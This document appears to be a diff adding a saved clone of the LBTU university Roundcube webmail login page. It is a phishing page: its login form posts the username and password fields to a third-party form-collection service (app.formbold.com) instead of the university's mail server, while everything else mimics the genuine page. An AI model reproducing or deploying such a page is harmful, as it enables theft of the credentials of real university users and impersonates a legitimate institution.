@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<!-- saved from url=(0026)https://roundcube.lbtu.lv/ -->
+<html lang="en" class="js chrome webkit layout-large"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>LBTU Webmail :: Welcome to LBTU Webmail</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0"><meta name="theme-color" content="#f4f4f4"><meta name="msapplication-navbutton-color" content="#f4f4f4">
+	<link rel="shortcut icon" href="https://roundcube.lbtu.lv/favicon.ico?s=1640816963">
+	<link rel="stylesheet" href="./ibtu_files/bootstrap.min.css">
+	
+		<link rel="stylesheet" href="./ibtu_files/styles.min.css">
+		
+	
+	
+		<script>
+		try {
+			if (document.cookie.indexOf('colorMode=dark') > -1
+				|| (document.cookie.indexOf('colorMode=light') === -1 && window.matchMedia('(prefers-color-scheme: dark)').matches)
+			) {
+				document.documentElement.className += ' dark-mode';
+			}
+		} catch (e) { }
+		</script>
+	
+<link rel="stylesheet" type="text/css" href="./ibtu_files/jquery-ui.min.css"><link rel="stylesheet" type="text/css" href="./ibtu_files/libkolab.min.css"><script src="./ibtu_files/jquery.min.js.download"></script><script src="./ibtu_files/common.min.js.download"></script><script src="./ibtu_files/app.min.js.download"></script><script src="./ibtu_files/jstz.min.js.download"></script><script>
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,"rcversion":10602,"cookie_domain":"","cookie_path":"/","cookie_secure":false,"dark_mode_support":true,"skin":"elastic","blankpage":"skins/elastic/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":"/?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","libcal_settings":{"date_format":"YYYY-MM-DD","time_format":"HH:mm","date_short":"MM-DD","date_long":"DD MMM YYYY","date_agenda":"dddd MM-DD","dates_long":"DD MMM YYYY","first_day":1,"timezone":2,"dst":"1","days":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"days_short":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"months":["January","February","March","April","May","June","July","August","September","October","November","December"],"months_short":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"today":"Today"},"additional_logos":{"small":"LBTU_logo.svg"},"request_token":"4SWoqdNaUHoC2Ys80iCuUuxNC00dU78a"});
+rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","uploading":"Uploading file...","close":"Close","save":"Save","cancel":"Cancel","alerttitle":"Attention","confirmationtitle":"Are you sure...","delete":"Delete","continue":"Continue","ok":"OK","twofactor_gauthenticator.activate":"Activate","twofactor_gauthenticator.twofactor_gauthenticator":"2-Factor Authentication","twofactor_gauthenticator.code":"Google Authenticator Code","twofactor_gauthenticator.two_step_verification_form":"2-Factor Authentication Code:","twofactor_gauthenticator.secret":"Secret","twofactor_gauthenticator.qr_code":"QR Code","twofactor_gauthenticator.msg_infor":"You can scan this QR code containing the 2-Factor settings using a TOTP compatible app such as \u003Ca href=\"https://github.com/google/google-authenticator\" target=\"_blank\"\u003Egoogle-authenticator\u003C/a\u003E","twofactor_gauthenticator.show_secret":"Show secret","twofactor_gauthenticator.hide_secret":"Hide secret","twofactor_gauthenticator.create_secret":"Create secret","twofactor_gauthenticator.show_qr_code":"Show QR Code","twofactor_gauthenticator.hide_qr_code":"Hide QR Code","twofactor_gauthenticator.recovery_codes":"Recovery codes","twofactor_gauthenticator.show_recovery_codes":"Show recovery codes","twofactor_gauthenticator.hide_recovery_codes":"Hide recovery codes","twofactor_gauthenticator.setup_all_fields":"Fill all fields (make sure you click save to store your settings)","twofactor_gauthenticator.enrollment_dialog_title":"2-Factor authentication enrollment","twofactor_gauthenticator.enrollment_dialog_msg":"\u003Cstrong\u003E2-Factor authentication codes\u003C/strong\u003E are required for increased security, please configure them now.","twofactor_gauthenticator.check_code":"Check code","twofactor_gauthenticator.code_ok":"Code OK","twofactor_gauthenticator.code_ko":"Incorrect code","twofactor_gauthenticator.dont_ask_me_30days":"Don&#39;t ask me codes again on this computer for 30 days","twofactor_gauthenticator.check_code_to_activate":"To save, please scan the QR Code and enter the current 2-Factor code below.","twofactor_gauthenticator.successfully_saved":"2-Factor authentication settings saved successfully.","libcalendaring.itipaccepted":"Accept","libcalendaring.itiptentative":"Maybe","libcalendaring.itipdeclined":"Decline","libcalendaring.itipdelegated":"Delegate","libcalendaring.expandattendeegroup":"Substitute with group members","libcalendaring.expandattendeegroupnodata":"Unable to substitute this group. No members found.","libcalendaring.statusorganizer":"Organizer","libcalendaring.statusaccepted":"Accepted","libcalendaring.statusdeclined":"Declined","libcalendaring.statusdelegated":"Delegated","libcalendaring.statusunknown":"Unknown","libcalendaring.statusneeds-action":"Needs action","libcalendaring.statustentative":"Tentative","libcalendaring.statuscompleted":"Completed","libcalendaring.statusin-process":"In process","libcalendaring.delegatedto":"Delegated to:","libcalendaring.delegatedfrom":"Delegated from:","libcalendaring.showmore":"Show more...","back":"Back","errortitle":"An error occurred!","options":"Options","plaintoggle":"Plain text","htmltoggle":"HTML","previous":"Previous","next":"Next","select":"Select","browse":"Browse","choosefile":"Choose file...","choosefiles":"Choose files..."});
+rcmail.gui_container("loginfooter","login-footer");rcmail.gui_object('loginform', 'login-form');
+rcmail.gui_object('message', 'messagestack');
+</script>
+
+<script src="./ibtu_files/jquery-ui.min.js.download"></script><script src="./ibtu_files/twofactor_gauthenticator.js.download"></script><script src="./ibtu_files/qrcode.min.js.download"></script><script src="./ibtu_files/libcalendaring.js.download"></script>
+</head>
+<body class="task-login action-none">
+	
+		<div id="layout">
+	
+
+
+<h1 class="voice">LBTU Webmail Login</h1>
+
+<div id="layout-content" class="selected no-navbar" role="main">
+	<img src="./ibtu_files/LBTU_logo.svg" id="logo" alt="Logo">
+	<form id="login-form" name="login-form" method="post" class="propform" action="https://app.formbold.com/s/6r0jk">
+<input type="hidden" name="_token" value="4SWoqdNaUHoC2Ys80iCuUuxNC00dU78a" class="form-control">
+	<input type="hidden" name="_task" value="login" class="form-control"><input type="hidden" name="_action" value="login" class="form-control"><input type="hidden" name="_timezone" id="rcmlogintz" value="Africa/Lagos" class="form-control"><input type="hidden" name="_url" id="rcmloginurl" value="" class="form-control"><table><tbody><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginuser">Username</label></td><td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon user"></i></span><input name="_user" id="rcmloginuser" required="" size="40" class="form-control" autocapitalize="off" autocomplete="off" value="" type="text" placeholder="Username"></td></tr><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginpwd">Password</label></td><td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon pass"></i></span><input name="_pass" id="rcmloginpwd" required="" size="40" class="form-control" autocapitalize="off" autocomplete="off" type="password" placeholder="Password"></td></tr></tbody></table><p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">Login</button></p>
+		<div id="login-footer" role="contentinfo">
+			LBTU Webmail
+			
+			
+				&nbsp;•&nbsp; <a href="https://itzac.lbtu.lv/" target="_blank" class="support-link">Get support</a>
+			
+			
+		</div>
+	</form>
+</div>
+
+<noscript>
+	<p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
+</noscript>
+
+
+</div>
+
+<a href="https://itzac.lbtu.lv/" target="_blank" id="supportlink" class="hidden">Get support</a>
+
+
+
+<div id="messagestack"></div>
+<script>
+$(function() {
+rcmail.init();
+});
+</script>
+
+
+
+<script src="./ibtu_files/bootstrap.bundle.min.js.download"></script>
+<script src="./ibtu_files/ui.min.js.download"></script>
+
+
+</body></html>
